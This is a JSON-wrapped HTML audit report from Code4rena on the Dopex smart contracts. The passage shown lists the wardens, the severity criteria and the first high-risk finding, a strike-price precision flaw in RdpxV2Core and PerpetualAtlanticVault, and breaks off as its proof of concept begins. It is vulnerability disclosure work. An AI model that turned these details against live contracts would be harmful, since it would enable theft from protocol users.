{
  "circa": {
    "title": "Dopex ",
    "sponsor": "Dopex",
    "slug": "2023-08-dopex",
    "date": "2023-12-29",
    "findings": "https://github.com/code-423n4/2023-08-dopex-findings/issues",
    "contest": 278
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Dopex smart contract system written in Solidity. The audit took place between August 21—September 6 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>203 Wardens contributed reports to Dopex:</p>\n<ol>\n<li><a href=\"https://code4rena.com/@said\">said</a></li>\n<li><a href=\"https://code4rena.com/@peakbolt\">peakbolt</a></li>\n<li><a href=\"https://code4rena.com/@Toshii\">Toshii</a></li>\n<li><a href=\"https://code4rena.com/@__141345__\">__141345__</a></li>\n<li><a href=\"https://code4rena.com/@LokiThe5th\">LokiThe5th</a></li>\n<li><a href=\"https://code4rena.com/@Evo\">Evo</a></li>\n<li><a href=\"https://code4rena.com/@deadrxsezzz\">deadrxsezzz</a></li>\n<li><a href=\"https://code4rena.com/@volodya\">volodya</a></li>\n<li><a href=\"https://code4rena.com/@rvierdiiev\">rvierdiiev</a></li>\n<li><a href=\"https://code4rena.com/@0xnev\">0xnev</a></li>\n<li><a href=\"https://code4rena.com/@pep7siup\">pep7siup</a></li>\n<li><a href=\"https://code4rena.com/@juancito\">juancito</a></li>\n<li><a href=\"https://code4rena.com/@kutugu\">kutugu</a></li>\n<li><a href=\"https://code4rena.com/@QiuhaoLi\">QiuhaoLi</a></li>\n<li><a href=\"https://code4rena.com/@Yanchuan\">Yanchuan</a></li>\n<li><a href=\"https://code4rena.com/@catellatech\">catellatech</a></li>\n<li><a href=\"https://code4rena.com/@glcanvas\">glcanvas</a></li>\n<li><a href=\"https://code4rena.com/@nirlin\">nirlin</a></li>\n<li><a href=\"https://code4rena.com/@T1MOH\">T1MOH</a></li>\n<li><a href=\"https://code4rena.com/@c3phas\">c3phas</a></li>\n<li><a href=\"https://code4rena.com/@RED-LOTUS-REACH\">RED-LOTUS-REACH</a> (<a href=\"https://code4rena.com/@BlockChomper\">BlockChomper</a>, <a href=\"https://code4rena.com/@DedOhWale\">DedOhWale</a>, <a href=\"https://code4rena.com/@reentrant\">reentrant</a>, and <a href=\"https://code4rena.com/@escrow\">escrow</a>)</li>\n<li><a href=\"https://code4rena.com/@HChang26\">HChang26</a></li>\n<li><a href=\"https://code4rena.com/@ladboy233\">ladboy233</a></li>\n<li><a href=\"https://code4rena.com/@0xDING99YA\">0xDING99YA</a></li>\n<li><a href=\"https://code4rena.com/@dirk_y\">dirk_y</a></li>\n<li><a href=\"https://code4rena.com/@0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://code4rena.com/@HHK\">HHK</a></li>\n<li><a href=\"https://code4rena.com/@gjaldon\">gjaldon</a></li>\n<li><a href=\"https://code4rena.com/@0Kage\">0Kage</a></li>\n<li><a href=\"https://code4rena.com/@Tendency\">Tendency</a></li>\n<li><a href=\"https://code4rena.com/@Brenzee\">Brenzee</a></li>\n<li><a href=\"https://code4rena.com/@Nikki\">Nikki</a></li>\n<li><a href=\"https://code4rena.com/@mahdikarimi\">mahdikarimi</a></li>\n<li><a href=\"https://code4rena.com/@LowK\">LowK</a></li>\n<li><a href=\"https://code4rena.com/@0xMango\">0xMango</a></li>\n<li><a href=\"https://code4rena.com/@tapir\">tapir</a></li>\n<li><a href=\"https://code4rena.com/@Inspecktor\">Inspecktor</a></li>\n<li><a href=\"https://code4rena.com/@ABA\">ABA</a></li>\n<li><a href=\"https://code4rena.com/@zzebra83\">zzebra83</a></li>\n<li><a href=\"https://code4rena.com/@ak1\">ak1</a></li>\n<li><a href=\"https://code4rena.com/@ItsNio\">ItsNio</a></li>\n<li><a href=\"https://code4rena.com/@carrotsmuggler\">carrotsmuggler</a></li>\n<li><a href=\"https://code4rena.com/@bart1e\">bart1e</a></li>\n<li><a href=\"https://code4rena.com/@0x3b\">0x3b</a></li>\n<li><a href=\"https://code4rena.com/@wintermute\">wintermute</a></li>\n<li><a href=\"https://code4rena.com/@lsaudit\">lsaudit</a></li>\n<li><a href=\"https://code4rena.com/@bin2chen\">bin2chen</a></li>\n<li><a href=\"https://code4rena.com/@qpzm\">qpzm</a></li>\n<li><a href=\"https://code4rena.com/@josephdara\">josephdara</a></li>\n<li><a href=\"https://code4rena.com/@sces60107\">sces60107</a></li>\n<li><a href=\"https://code4rena.com/@0xvj\">0xvj</a></li>\n<li><a href=\"https://code4rena.com/@Udsen\">Udsen</a></li>\n<li><a href=\"https://code4rena.com/@rokinot\">rokinot</a></li>\n<li><a href=\"https://code4rena.com/@jasonxiale\">jasonxiale</a></li>\n<li><a href=\"https://code4rena.com/@chaduke\">chaduke</a></li>\n<li><a href=\"https://code4rena.com/@0xCiphky\">0xCiphky</a></li>\n<li><a href=\"https://code4rena.com/@ubermensch\">ubermensch</a></li>\n<li><a href=\"https://code4rena.com/@Aymen0909\">Aymen0909</a></li>\n<li><a href=\"https://code4rena.com/@kodyvim\">kodyvim</a></li>\n<li><a href=\"https://code4rena.com/@hals\">hals</a></li>\n<li><a href=\"https://code4rena.com/@crunch\">crunch</a></li>\n<li><a href=\"https://code4rena.com/@circlelooper\">circlelooper</a></li>\n<li><a href=\"https://code4rena.com/@Jiamin\">Jiamin</a></li>\n<li><a href=\"https://code4rena.com/@Juntao\">Juntao</a></li>\n<li><a href=\"https://code4rena.com/@eeshenggoh\">eeshenggoh</a></li>\n<li><a href=\"https://code4rena.com/@Sathish9098\">Sathish9098</a></li>\n<li><a href=\"https://code4rena.com/@Inspex\">Inspex</a> (<a href=\"https://code4rena.com/@DeStinE21\">DeStinE21</a>, <a href=\"https://code4rena.com/@ErbaZZ\">ErbaZZ</a>, <a href=\"https://code4rena.com/@Resistor\">Resistor</a>, <a href=\"https://code4rena.com/@Rugsurely\">Rugsurely</a>, <a href=\"https://code4rena.com/@doggo\">doggo</a>, <a href=\"https://code4rena.com/@jokopoppo\">jokopoppo</a>, <a href=\"https://code4rena.com/@mimic_f\">mimic_f</a>, and <a href=\"https://code4rena.com/@rxnnxchxi\">rxnnxchxi</a>)</li>\n<li><a href=\"https://code4rena.com/@gkrastenov\">gkrastenov</a></li>\n<li><a href=\"https://code4rena.com/@Nyx\">Nyx</a></li>\n<li><a href=\"https://code4rena.com/@0xWaitress\">0xWaitress</a></li>\n<li><a href=\"https://code4rena.com/@wallstreetvilkas\">wallstreetvilkas</a></li>\n<li><a href=\"https://code4rena.com/@Bauchibred\">Bauchibred</a></li>\n<li><a href=\"https://code4rena.com/@Matin\">Matin</a></li>\n<li><a href=\"https://code4rena.com/@niki\">niki</a></li>\n<li><a href=\"https://code4rena.com/@flacko\">flacko</a></li>\n<li><a href=\"https://code4rena.com/@KrisApostolov\">KrisApostolov</a></li>\n<li><a href=\"https://code4rena.com/@0xTiwa\">0xTiwa</a></li>\n<li><a href=\"https://code4rena.com/@ArmedGoose\">ArmedGoose</a></li>\n<li><a href=\"https://code4rena.com/@oakcobalt\">oakcobalt</a></li>\n<li><a href=\"https://code4rena.com/@pontifex\">pontifex</a></li>\n<li><a href=\"https://code4rena.com/@0xgrbr\">0xgrbr</a></li>\n<li><a href=\"https://code4rena.com/@LeoS\">LeoS</a></li>\n<li><a href=\"https://code4rena.com/@Viktor_Cortess\">Viktor_Cortess</a></li>\n<li><a href=\"https://code4rena.com/@nemveer\">nemveer</a></li>\n<li><a href=\"https://code4rena.com/@836541\">836541</a></li>\n<li><a href=\"https://code4rena.com/@minhtrng\">minhtrng</a></li>\n<li><a href=\"https://code4rena.com/@visualbits\">visualbits</a></li>\n<li><a href=\"https://code4rena.com/@Qeew\">Qeew</a></li>\n<li><a href=\"https://code4rena.com/@0xPsuedoPandit\">0xPsuedoPandit</a></li>\n<li><a href=\"https://code4rena.com/@0xmystery\">0xmystery</a></li>\n<li><a href=\"https://code4rena.com/@umarkhatab_465\">umarkhatab_465</a></li>\n<li><a href=\"https://code4rena.com/@Cosine\">Cosine</a></li>\n<li><a href=\"https://code4rena.com/@Topmark\">Topmark</a></li>\n<li><a href=\"https://code4rena.com/@SBSecurity\">SBSecurity</a> (<a href=\"https://code4rena.com/@Slavcheww\">Slavcheww</a> and <a href=\"https://code4rena.com/@Blckhv\">Blckhv</a>)</li>\n<li><a href=\"https://code4rena.com/@0xmuxyz\">0xmuxyz</a></li>\n<li><a href=\"https://code4rena.com/@ciphermarco\">ciphermarco</a></li>\n<li><a href=\"https://code4rena.com/@mark0v\">mark0v</a></li>\n<li><a href=\"https://code4rena.com/@bitsurfer\">bitsurfer</a></li>\n<li><a href=\"https://code4rena.com/@hunter_w3b\">hunter_w3b</a></li>\n<li><a href=\"https://code4rena.com/@rjs\">rjs</a></li>\n<li><a href=\"https://code4rena.com/@K42\">K42</a></li>\n<li><a href=\"https://code4rena.com/@MohammedRizwan\">MohammedRizwan</a></li>\n<li><a href=\"https://code4rena.com/@degensec\">degensec</a></li>\n<li><a href=\"https://code4rena.com/@erebus\">erebus</a></li>\n<li><a href=\"https://code4rena.com/@mert_eren\">mert_eren</a></li>\n<li><a href=\"https://code4rena.com/@zaevlad\">zaevlad</a></li>\n<li><a href=\"https://code4rena.com/@0xWagmi\">0xWagmi</a></li>\n<li><a href=\"https://code4rena.com/@ether_sky\">ether_sky</a></li>\n<li><a href=\"https://code4rena.com/@ravikiranweb3\">ravikiranweb3</a></li>\n<li><a href=\"https://code4rena.com/@GangsOfBrahmin\">GangsOfBrahmin</a> (<a href=\"https://code4rena.com/@Satyam_Sharma\">Satyam_Sharma</a> and <a href=\"https://code4rena.com/@0xweb3boy\">0xweb3boy</a>)</li>\n<li><a href=\"https://code4rena.com/@vangrim\">vangrim</a></li>\n<li><a href=\"https://code4rena.com/@Hama\">Hama</a></li>\n<li><a href=\"https://code4rena.com/@okolicodes\">okolicodes</a></li>\n<li><a href=\"https://code4rena.com/@ginlee\">ginlee</a></li>\n<li><a href=\"https://code4rena.com/@WoolCentaur\">WoolCentaur</a></li>\n<li><a href=\"https://code4rena.com/@IceBear\">IceBear</a></li>\n<li><a href=\"https://code4rena.com/@ayden\">ayden</a></li>\n<li><a href=\"https://code4rena.com/@0xkazim\">0xkazim</a></li>\n<li><a href=\"https://code4rena.com/@AkshaySrivastav\">AkshaySrivastav</a></li>\n<li><a href=\"https://code4rena.com/@KmanOfficial\">KmanOfficial</a></li>\n<li><a href=\"https://code4rena.com/@codegpt\">codegpt</a></li>\n<li><a href=\"https://code4rena.com/@savi0ur\">savi0ur</a></li>\n<li><a href=\"https://code4rena.com/@peanuts\">peanuts</a></li>\n<li><a href=\"https://code4rena.com/@piyushshukla\">piyushshukla</a></li>\n<li><a href=\"https://code4rena.com/@catwhiskeys\">catwhiskeys</a></li>\n<li><a href=\"https://code4rena.com/@mitko1111\">mitko1111</a></li>\n<li><a href=\"https://code4rena.com/@0xTheC0der\">0xTheC0der</a></li>\n<li><a href=\"https://code4rena.com/@asui\">asui</a></li>\n<li><a href=\"https://code4rena.com/@dethera\">dethera</a></li>\n<li><a href=\"https://code4rena.com/@klau5\">klau5</a></li>\n<li><a href=\"https://code4rena.com/@parsely\">parsely</a></li>\n<li><a href=\"https://code4rena.com/@minhquanym\">minhquanym</a></li>\n<li><a href=\"https://code4rena.com/@nobody2018\">nobody2018</a></li>\n<li><a href=\"https://code4rena.com/@max10afternoon\">max10afternoon</a></li>\n<li><a href=\"https://code4rena.com/@lanrebayode77\">lanrebayode77</a></li>\n<li><a href=\"https://code4rena.com/@Neon2835\">Neon2835</a></li>\n<li><a href=\"https://code4rena.com/@Kow\">Kow</a></li>\n<li><a href=\"https://code4rena.com/@0xbranded\">0xbranded</a></li>\n<li><a href=\"https://code4rena.com/@SpicyMeatball\">SpicyMeatball</a></li>\n<li><a href=\"https://code4rena.com/@joaovwfreire\">joaovwfreire</a></li>\n<li><a href=\"https://code4rena.com/@alexfilippov314\">alexfilippov314</a></li>\n<li><a href=\"https://code4rena.com/@0xHelium\">0xHelium</a></li>\n<li><a href=\"https://code4rena.com/@ABAIKUNANBAEV\">ABAIKUNANBAEV</a></li>\n<li><a href=\"https://code4rena.com/@Vagner\">Vagner</a></li>\n<li><a href=\"https://code4rena.com/@etherhood\">etherhood</a></li>\n<li><a href=\"https://code4rena.com/@qbs\">qbs</a></li>\n<li><a href=\"https://code4rena.com/@alexzoid\">alexzoid</a></li>\n<li><a href=\"https://code4rena.com/@mrudenko\">mrudenko</a></li>\n<li><a href=\"https://code4rena.com/@tnquanghuy0512\">tnquanghuy0512</a></li>\n<li><a href=\"https://code4rena.com/@0xrafaelnicolau\">0xrafaelnicolau</a></li>\n<li><a href=\"https://code4rena.com/@Krace\">Krace</a></li>\n<li><a href=\"https://code4rena.com/@koo\">koo</a></li>\n<li><a href=\"https://code4rena.com/@_eperezok\">_eperezok</a></li>\n<li><a href=\"https://code4rena.com/@ElCid\">ElCid</a></li>\n<li><a href=\"https://code4rena.com/@yashar\">yashar</a></li>\n<li><a href=\"https://code4rena.com/@0xc0ffEE\">0xc0ffEE</a></li>\n<li><a href=\"https://code4rena.com/@Baki\">Baki</a> (<a href=\"https://code4rena.com/@Viraz\">Viraz</a> and <a href=\"https://code4rena.com/@supernova\">supernova</a>)</li>\n<li><a href=\"https://code4rena.com/@chainsnake\">chainsnake</a></li>\n<li><a href=\"https://code4rena.com/@dimulski\">dimulski</a></li>\n<li><a href=\"https://code4rena.com/@0xMosh\">0xMosh</a></li>\n<li><a href=\"https://code4rena.com/@halden\">halden</a></li>\n<li><a href=\"https://code4rena.com/@mussucal\">mussucal</a></li>\n<li><a href=\"https://code4rena.com/@gizzy\">gizzy</a></li>\n<li><a href=\"https://code4rena.com/@MiniGlome\">MiniGlome</a></li>\n<li><a href=\"https://code4rena.com/@Talfao\">Talfao</a></li>\n<li><a href=\"https://code4rena.com/@gumgumzum\">gumgumzum</a></li>\n<li><a href=\"https://code4rena.com/@Jorgect\">Jorgect</a></li>\n<li><a href=\"https://code4rena.com/@LFGSecurity\">LFGSecurity</a> (<a href=\"https://code4rena.com/@0xfusion\">0xfusion</a> and <a href=\"https://code4rena.com/@georgits\">georgits</a>)</li>\n<li><a href=\"https://code4rena.com/@grearlake\">grearlake</a></li>\n<li><a href=\"https://code4rena.com/@0x111\">0x111</a></li>\n<li><a href=\"https://code4rena.com/@atrixs6\">atrixs6</a></li>\n<li><a href=\"https://code4rena.com/@Mike_Bello90\">Mike_Bello90</a></li>\n<li><a href=\"https://code4rena.com/@Anirruth\">Anirruth</a></li>\n<li><a href=\"https://code4rena.com/@clash\">clash</a></li>\n<li><a href=\"https://code4rena.com/@ge6a\">ge6a</a></li>\n<li><a href=\"https://code4rena.com/@Blockian\">Blockian</a></li>\n<li><a href=\"https://code4rena.com/@DanielArmstrong\">DanielArmstrong</a></li>\n<li><a href=\"https://code4rena.com/@pks_\">pks_</a></li>\n<li><a href=\"https://code4rena.com/@0xklh\">0xklh</a></li>\n<li><a href=\"https://code4rena.com/@blutorque\">blutorque</a></li>\n<li><a href=\"https://code4rena.com/@Snow24\">Snow24</a></li>\n<li><a href=\"https://code4rena.com/@BugzyVonBuggernaut\">BugzyVonBuggernaut</a></li>\n<li><a href=\"https://code4rena.com/@ke1caM\">ke1caM</a></li>\n<li><a href=\"https://code4rena.com/@Norah\">Norah</a></li>\n<li><a href=\"https://code4rena.com/@auditsea\">auditsea</a></li>\n<li><a href=\"https://code4rena.com/@spidy730\">spidy730</a></li>\n<li><a href=\"https://code4rena.com/@sl1\">sl1</a></li>\n<li><a href=\"https://code4rena.com/@0xsurena\">0xsurena</a></li>\n<li><a href=\"https://code4rena.com/@sh1v\">sh1v</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://code4rena.com/@GalloDaSballo\">Alex the Entreprenerd</a>.</p>\n<p>Final report assembled by PaperParachute.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 26 unique vulnerabilities. Of these vulnerabilities, 9 received a risk rating in the category of HIGH severity and 17 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 52 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 10 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-08-dopex\">C4 Dopex  repository</a>, and is composed of 9 smart contracts written in the Solidity programming language and includes 2264 lines of Solidity code.</p>\n<p>In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, <strong>IllIllI-bot</strong> from warden <a href=\"https://code4rena.com/@illilli\">IllIllI</a>, generated the <a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3\">Automated Findings report</a> and all findings therein were classified as out of scope.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-9\" style=\"position:relative;\"><a href=\"#high-risk-findings-9\" aria-label=\"high risk findings 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (9)</h1>\n<h2 id=\"h-01-improper-precision-of-strike-price-calculation-can-result-in-broken-protocol\" style=\"position:relative;\"><a href=\"#h-01-improper-precision-of-strike-price-calculation-can-result-in-broken-protocol\" aria-label=\"h 01 improper precision of strike price calculation can result in broken protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2083\">[H-01] Improper precision of strike price calculation can result in broken protocol</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2083\">Toshii</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2014\">Matin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1844\">Qeew</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1606\">visualbits</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1357\">crunch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1330\">circlelooper</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1206\">qpzm</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1111\">Jiamin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1097\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1060\">Juntao</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1005\">0xmystery</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/963\">eeshenggoh</a>, lsaudit (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/812\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/811\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/746\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/616\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/550\">Cosine</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/546\">Topmark</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/127\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/99\">deadrxsezzz</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/913\">piyushshukla</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/102\">catwhiskeys</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1189-L1190\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1189-L1190</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L576-L583\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L576-L583</a></p>\n<p>Due to a lack of adequate precision, the calculated strike price for a PUT option for rDPX is not guaranteed to be 25% OTM, which breaks core assumptions around (1) protecting downside price movement of the rDPX which makes up part of the collateral for dpxETH &#x26; (2) not overpaying for PUT option protection.</p>\n<p>More specifically, the price of rDPX as used in the <code>calculateBondCost</code> function of the RdpxV2Core contract is represented as ETH / rDPX, and is given in 8 decimals of precision. To calculate the strike price which is 25% OTM based on the current price, the logic calls the <code>roundUp</code> function on what is effectively 75% of the current spot rDPX price. The issue is with the <code>roundUp</code> function of the PerpetualAtlanticVault contract, which effectively imposes a minimum value of 1e6.</p>\n<p>Considering approximate recent market prices of <code>$</code>2000/ETH and <code>$</code>20/rDPX, the current price of rDPX in 8 decimals of precision would be exactly 1e6. Then to calculate the 25% OTM strike price, we would arrive at a strike price of <code>1e6 * 0.75 = 75e4</code>. The <code>roundUp</code> function will then round up this value to <code>1e6</code> as the strike price, and issue the PUT option using that invalid strike price. Obviously this strike price is not 25% OTM, and since its an ITM option, the premium imposed will be significantly higher. Additionally this does not match the implementation as outlined in the docs.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When a user calls the <code>bond</code> function of the RdpxV2Core contract, it will calculate the <code>rdpxRequired</code> and <code>wethRequired</code> required by the user in order to mint a specific <code>_amount</code> of dpxETH, which is calculated using the <code>calculateBondCost</code> function:</p>\n<pre 